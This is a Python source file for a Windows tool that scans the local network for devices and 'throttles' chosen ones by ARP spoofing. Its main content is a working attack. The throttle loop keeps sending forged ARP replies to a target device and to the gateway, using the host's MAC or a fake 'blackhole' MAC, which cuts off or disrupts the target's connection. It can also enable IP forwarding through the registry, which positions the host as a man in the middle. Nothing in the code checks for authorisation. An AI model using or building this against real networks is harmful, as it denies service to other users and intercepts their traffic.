"""
Network Scanner & ARP Throttler Engine
Handles network scanning, ARP spoofing for throttling, and device management.
Uses multiple scan methods for maximum device detection on Windows.
"""

import threading
import time
import socket
import struct
import uuid
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from typing import Optional, Callable

try:
    from scapy.all import (
        ARP, Ether, srp, send, sendp, getmacbyip, conf,
        get_if_list, get_if_addr, get_if_hwaddr, IFACES
    )
    from scapy.arch.windows import get_windows_if_list
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

import psutil


@dataclass
class NetworkDevice:
    """Represents a device found on the network."""
    ip: str
    mac: str
    hostname: str = "Unknown"
    vendor: str = "Unknown"
    is_gateway: bool = False
    is_throttled: bool = False
    is_self: bool = False
    last_seen: float = 0.0
    throttle_level: int = 100  # 0=full block, 50=half, 100=normal


@dataclass
class NetworkInterface:
    """Represents a network interface on this machine."""
    name: str
    display_name: str
    ip: str
    mac: str
    gateway_ip: str = ""
    gateway_mac: str = ""
    subnet_mask: str = "255.255.255.0"
    scapy_iface: object = None  # Store scapy interface reference


class NetworkEngine:
    """Core engine for network scanning and ARP-based throttling."""

    def __init__(self):
        self.devices: dict[str, NetworkDevice] = {}
        self.interface: Optional[NetworkInterface] = None
        self._throttle_threads: dict[str, threading.Thread] = {}
        self._throttle_stop_events: dict[str, threading.Event] = {}
        self._scan_thread: Optional[threading.Thread] = None
        self._running = False
        self._hostname_cache: dict[str, str] = {}
        self._hostname_futures = {}
        self._hostname_lock = threading.Lock()
        self._hostname_executor = ThreadPoolExecutor(max_workers=8)
        self.on_devices_updated: Optional[Callable] = None
        self.on_status_changed: Optional[Callable] = None

    def get_interfaces(self) -> list[NetworkInterface]:
        """Get all available network interfaces, matching psutil with scapy."""
        interfaces = []
        net_if = psutil.net_if_addrs()
        net_stats = psutil.net_if_stats()

        # Build scapy interface lookup by IP
        scapy_iface_map = {}
        if SCAPY_AVAILABLE:
            try:
                for iface in IFACES.values():
                    try:
                        ip = getattr(iface, 'ip', None) or getattr(iface, 'ips', [None])[0]
                        if ip and ip != '127.0.0.1' and ip != '0.0.0.0':
                            scapy_iface_map[ip] = iface
                    except Exception:
                        pass
            except Exception:
                pass

        for iface_name, addrs in net_if.items():
            if iface_name in net_stats and not net_stats[iface_name].isup:
                continue

            ipv4 = None
            mac = None
            subnet = "255.255.255.0"
            for addr in addrs:
                if addr.family == socket.AF_INET and addr.address != "127.0.0.1":
                    ipv4 = addr.address
                    subnet = addr.netmask or "255.255.255.0"
                elif addr.family == psutil.AF_LINK:
                    mac = addr.address

            if ipv4 and mac:
                gateway_ip = self._get_default_gateway(ipv4)
                scapy_if = scapy_iface_map.get(ipv4, None)

                iface = NetworkInterface(
                    name=iface_name,
                    display_name=iface_name,
                    ip=ipv4,
                    mac=mac.replace("-", ":").lower(),
                    gateway_ip=gateway_ip,
                    subnet_mask=subnet,
                    scapy_iface=scapy_if
                )
                interfaces.append(iface)

        return interfaces

    def _get_default_gateway(self, interface_ip: str) -> str:
        """Find the default gateway for the given interface IP."""
        try:
            result = subprocess.run(
                ["powershell", "-Command",
                 "Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -ExpandProperty NextHop"],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    line = line.strip()
                    if line and self._is_same_subnet(interface_ip, line):
                        return line
                lines = result.stdout.strip().split('\n')
                if lines and lines[0].strip():
                    return lines[0].strip()
        except Exception:
            pass

        # Fallback: try ipconfig
        try:
            result = subprocess.run(
                ["ipconfig"], capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                found_ip = False
                for line in lines:
                    if interface_ip in line:
                        found_ip = True
                    if found_ip and ('gateway' in line.lower() or 'gerbang' in line.lower()):
                        match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                        if match:
                            return match.group(1)
        except Exception:
            pass

        parts = interface_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.1"

    def _is_same_subnet(self, ip1: str, ip2: str, mask: str = "255.255.255.0") -> bool:
        """Check if two IPs are in the same subnet."""
        try:
            ip1_int = struct.unpack('!I', socket.inet_aton(ip1))[0]
            ip2_int = struct.unpack('!I', socket.inet_aton(ip2))[0]
            mask_int = struct.unpack('!I', socket.inet_aton(mask))[0]
            return (ip1_int & mask_int) == (ip2_int & mask_int)
        except Exception:
            return False

    def set_interface(self, interface: NetworkInterface):
        """Set the active network interface."""
        self.interface = interface

        # Also set scapy's default interface
        if SCAPY_AVAILABLE and interface.scapy_iface:
            try:
                conf.iface = interface.scapy_iface
                self._notify_status(
                    f"Interface: {interface.display_name} ({interface.ip}) - Scapy OK"
                )
            except Exception:
                self._notify_status(
                    f"Interface: {interface.display_name} ({interface.ip}) - Scapy fallback"
                )
        else:
            self._notify_status(f"Interface: {interface.display_name} ({interface.ip})")

    def scan_network(self, callback: Optional[Callable] = None, fast_mode: bool = True):
        """Scan devices on the selected network interface."""
        if not self.interface:
            self._notify_status("ERROR: No interface selected!")
            return

        def _scan():
            self._notify_status("Scanning network (multi-method)...")
            started_at = time.time()
            try:
                # Method 1: ARP table from Windows (most reliable)
                self._notify_status("Step 1/3: Reading ARP table...")
                self._scan_arp_table()

                # Method 2: Scapy ARP broadcast (fast first)
                if SCAPY_AVAILABLE:
                    self._notify_status("Step 2/3: ARP scan (scapy)...")
                    if fast_mode:
                        self._scan_scapy_arp(timeout=2, retry=1)
                    else:
                        self._scan_scapy_arp(timeout=4, retry=2)

                # Method 3: Ping sweep fallback when quick discovery is too low
                discovered_targets = len([
                    d for d in self.devices.values()
                    if not d.is_self and not d.is_gateway
                ])
                if not fast_mode or discovered_targets < 2:
                    self._notify_status("Step 3/3: Ping sweep fallback...")
                    self._ping_sweep(timeout_ms=250, workers=64)
                    self._scan_arp_table()

                # Resolve gateway MAC
                self._resolve_gateway_mac()

                device_count = len([d for d in self.devices.values()
                                   if not d.is_self and not d.is_gateway])
                elapsed = time.time() - started_at
                self._notify_status(f"Found {device_count} devices on network ({elapsed:.1f}s)")

                if self.on_devices_updated:
                    self.on_devices_updated()
                if callback:
                    callback()

            except Exception as e:
                self._notify_status(f"Scan error: {str(e)}")
                if callback:
                    callback()

        self._scan_thread = threading.Thread(target=_scan, daemon=True)
        self._scan_thread.start()

    def _scan_arp_table(self):
        """Read devices from Windows ARP table (arp -a)."""
        try:
            result = subprocess.run(
                ["arp", "-a"],
                capture_output=True, text=True, timeout=4,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode != 0:
                return

            subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'

            for line in result.stdout.split('\n'):
                line = line.strip()
                # Parse: 192.168.1.1    aa-bb-cc-dd-ee-ff    dynamic
                match = re.match(
                    r'(\d+\.\d+\.\d+\.\d+)\s+([\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2})\s+(\w+)',
                    line
                )
                if match:
                    ip = match.group(1)
                    mac = match.group(2).replace('-', ':').lower()
                    entry_type = match.group(3).lower()

                    # Skip broadcast and multicast
                    if mac == 'ff:ff:ff:ff:ff:ff':
                        continue
                    if ip.endswith('.255'):
                        continue
                    if not ip.startswith(subnet_prefix):
                        continue

                    # Only dynamic entries (real devices)
                    if entry_type != 'dynamic' and entry_type != 'dinamis':
                        continue

                    self._add_or_update_device(ip, mac)

        except Exception as e:
            self._notify_status(f"ARP table scan error: {e}")

    def _ping_sweep(self, timeout_ms: int = 250, workers: int = 64):
        """Fast parallel ping sweep to warm ARP cache."""
        try:
            subnet_prefix = '.'.join(self.interface.ip.split('.')[:3])
            ips = [f"{subnet_prefix}.{i}" for i in range(1, 255)]

            def ping_ip(ip: str):
                try:
                    subprocess.run(
                        ["ping", "-n", "1", "-w", str(timeout_ms), ip],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=2,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                except Exception:
                    pass

            with ThreadPoolExecutor(max_workers=workers) as pool:
                list(pool.map(ping_ip, ips))
        except Exception:
            pass

    def _scan_scapy_arp(self, timeout: int = 4, retry: int = 2):
        """Scan using scapy ARP requests."""
        if not SCAPY_AVAILABLE:
            return

        try:
            target_ip = self._get_network_range()

            arp_request = ARP(pdst=target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request

            # Use the mapped scapy interface if available
            iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface

            answered, _ = srp(
                packet, timeout=timeout, verbose=False, retry=retry, iface=iface
            )

            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc.lower()
                self._add_or_update_device(ip, mac)

        except Exception as e:
            self._notify_status(f"Scapy ARP scan: {e}")

    def _resolve_gateway_mac(self):
        """Resolve the gateway MAC address."""
        if not self.interface or not self.interface.gateway_ip:
            return

        gw_ip = self.interface.gateway_ip

        # Check if gateway is already in devices
        if gw_ip in self.devices:
            self.interface.gateway_mac = self.devices[gw_ip].mac
            self.devices[gw_ip].is_gateway = True
            return

        # Try getmacbyip
        if SCAPY_AVAILABLE:
            try:
                gw_mac = getmacbyip(gw_ip)
                if gw_mac:
                    self.interface.gateway_mac = gw_mac.lower()
                    self._add_or_update_device(gw_ip, gw_mac.lower())
                    if gw_ip in self.devices:
                        self.devices[gw_ip].is_gateway = True
                    return
            except Exception:
                pass

        # Fallback: read from arp table
        try:
            result = subprocess.run(
                ["arp", "-a", gw_ip],
                capture_output=True, text=True, timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            for line in result.stdout.split('\n'):
                match = re.search(
                    r'([\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2})',
                    line
                )
                if match and gw_ip in line:
                    mac = match.group(1).replace('-', ':').lower()
                    if mac != 'ff:ff:ff:ff:ff:ff':
                        self.interface.gateway_mac = mac
                        self._add_or_update_device(gw_ip, mac)
                        if gw_ip in self.devices:
                            self.devices[gw_ip].is_gateway = True
                        return
        except Exception:
            pass

    def _add_or_update_device(self, ip: str, mac: str):
        """Add or update a device in the device list."""
        is_gateway = (ip == self.interface.gateway_ip) if self.interface else False
        is_self = (ip == self.interface.ip) if self.interface else False

        hostname = self._hostname_cache.get(ip, "Unknown")

        if ip in self.devices:
            dev = self.devices[ip]
            dev.mac = mac
            if hostname != "Unknown":
                dev.hostname = hostname
            dev.is_gateway = is_gateway
            dev.is_self = is_self
            dev.last_seen = time.time()
        else:
            self.devices[ip] = NetworkDevice(
                ip=ip,
                mac=mac,
                hostname=hostname,
                is_gateway=is_gateway,
                is_self=is_self,
                last_seen=time.time()
            )

        if hostname == "Unknown":
            self._queue_hostname_resolution(ip)

    def _queue_hostname_resolution(self, ip: str):
        """Resolve hostnames in background to avoid slowing down network scan."""
        with self._hostname_lock:
            if ip in self._hostname_cache:
                return

            pending = self._hostname_futures.get(ip)
            if pending and not pending.done():
                return

            future = self._hostname_executor.submit(self._resolve_hostname, ip)
            self._hostname_futures[ip] = future
            future.add_done_callback(
                lambda fut, target_ip=ip: self._on_hostname_resolved(target_ip, fut)
            )

    def _on_hostname_resolved(self, ip: str, future):
        try:
            hostname = future.result()
        except Exception:
            hostname = "Unknown"

        with self._hostname_lock:
            self._hostname_futures.pop(ip, None)
            self._hostname_cache[ip] = hostname

        if hostname != "Unknown" and ip in self.devices:
            self.devices[ip].hostname = hostname
            if self.on_devices_updated:
                self.on_devices_updated()

    def _get_network_range(self) -> str:
        """Calculate the network range from interface IP and subnet mask."""
        ip = self.interface.ip
        mask = self.interface.subnet_mask

        ip_int = struct.unpack('!I', socket.inet_aton(ip))[0]
        mask_int = struct.unpack('!I', socket.inet_aton(mask))[0]
        network_int = ip_int & mask_int

        cidr = bin(mask_int).count('1')
        network_ip = socket.inet_ntoa(struct.pack('!I', network_int))

        return f"{network_ip}/{cidr}"

    def _resolve_hostname(self, ip: str) -> str:
        """Try to resolve IP to hostname."""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except (socket.herror, socket.gaierror, OSError):
            return "Unknown"

    def _blackhole_mac(self, ip: str) -> str:
        """Generate a locally-administered fake MAC for hard block mode."""
        try:
            last_octet = int(ip.split('.')[-1]) & 0xFF
        except Exception:
            last_octet = 0
        return f"02:00:00:00:00:{last_octet:02x}"

    def throttle_device(self, ip: str, level: int = 0):
        """
        Throttle a device using ARP spoofing.
        level: 0 = full block, 50 = intermittent, 100 = normal
        """
        if not SCAPY_AVAILABLE:
            self._notify_status("ERROR: Scapy not available!")
            return

        if ip not in self.devices:
            return

        device = self.devices[ip]
        if device.is_self or device.is_gateway:
            return

        if not self.interface or not self.interface.gateway_mac:
            self._notify_status("ERROR: Gateway MAC not found. Scan first!")
            return

        self.restore_device(ip)

        if level >= 100:
            return

        device.is_throttled = True
        device.throttle_level = level

        stop_event = threading.Event()
        self._throttle_stop_events[ip] = stop_event

        def _spoof_loop():
            self._notify_status(f"⚡ Throttling {ip} (level: {100 - level}%)")
            gateway_ip = self.interface.gateway_ip
            target_mac = device.mac
            iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
            spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else self.interface.mac

            while not stop_event.is_set():
                try:
                    # Spoofed ARP: Tell target that gateway is at our MAC
                    arp_to_target = ARP(
                        op=2,
                        pdst=ip,
                        hwdst=target_mac,
                        psrc=gateway_ip,
                        hwsrc=spoof_hwsrc
                    )

                    # Spoofed ARP: Tell gateway that target is at our MAC
                    arp_to_gateway = ARP(
                        op=2,
                        pdst=gateway_ip,
                        hwdst=self.interface.gateway_mac,
                        psrc=ip,
                        hwsrc=spoof_hwsrc
                    )

                    send(arp_to_target, verbose=False, count=3, iface=iface)
                    send(arp_to_gateway, verbose=False, count=3, iface=iface)

                    if level == 0:
                        stop_event.wait(0.5)
                    elif level <= 30:
                        stop_event.wait(0.8)
                    elif level <= 60:
                        stop_event.wait(1.5)
                    else:
                        stop_event.wait(3.0)

                except Exception as e:
                    self._notify_status(f"Spoof error for {ip}: {e}")
                    stop_event.wait(2)

        thread = threading.Thread(target=_spoof_loop, daemon=True)
        self._throttle_threads[ip] = thread
        thread.start()

        if self.on_devices_updated:
            self.on_devices_updated()

    def restore_device(self, ip: str):
        """Restore a device to normal network operation."""
        if ip in self._throttle_stop_events:
            self._throttle_stop_events[ip].set()
            del self._throttle_stop_events[ip]

        if ip in self._throttle_threads:
            thread = self._throttle_threads[ip]
            thread.join(timeout=3)
            del self._throttle_threads[ip]

        if ip in self.devices:
            device = self.devices[ip]
            if device.is_throttled and self.interface:
                try:
                    iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface

                    # Send correct ARP to target
                    arp_to_target = ARP(
                        op=2,
                        pdst=ip,
                        hwdst=device.mac,
                        psrc=self.interface.gateway_ip,
                        hwsrc=self.interface.gateway_mac
                    )

                    # Send correct ARP to gateway
                    arp_to_gateway = ARP(
                        op=2,
                        pdst=self.interface.gateway_ip,
                        hwdst=self.interface.gateway_mac,
                        psrc=ip,
                        hwsrc=device.mac
                    )

                    send(arp_to_target, verbose=False, count=5, iface=iface)
                    send(arp_to_gateway, verbose=False, count=5, iface=iface)

                    self._notify_status(f"✅ Restored {ip} to normal")
                except Exception as e:
                    self._notify_status(f"Restore error for {ip}: {e}")

            device.is_throttled = False
            device.throttle_level = 100

        if self.on_devices_updated:
            self.on_devices_updated()

    def restore_all(self):
        """Restore all throttled devices."""
        throttled = [ip for ip, dev in self.devices.items() if dev.is_throttled]
        for ip in throttled:
            self.restore_device(ip)
        self._notify_status("All devices restored to normal")

    def cleanup(self):
        """Clean up all spoofing before exit."""
        self._running = False
        self.restore_all()
        try:
            self._hostname_executor.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass

    def _notify_status(self, message: str):
        """Send status update."""
        if self.on_status_changed:
            self.on_status_changed(message)

    def is_admin(self) -> bool:
        """Check if running with admin/elevated privileges."""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False

    def enable_ip_forwarding(self):
        """Enable IP forwarding on Windows."""
        try:
            subprocess.run(
                ["powershell", "-Command",
                 "Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            subprocess.run(
                ["reg", "add",
                 "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            self._notify_status("IP Forwarding enabled")
        except Exception as e:
            self._notify_status(f"Failed to enable IP forwarding: {e}")

    def disable_ip_forwarding(self):
        """Disable IP forwarding on Windows."""
        try:
            subprocess.run(
                ["reg", "add",
                 "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "0", "/f"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass
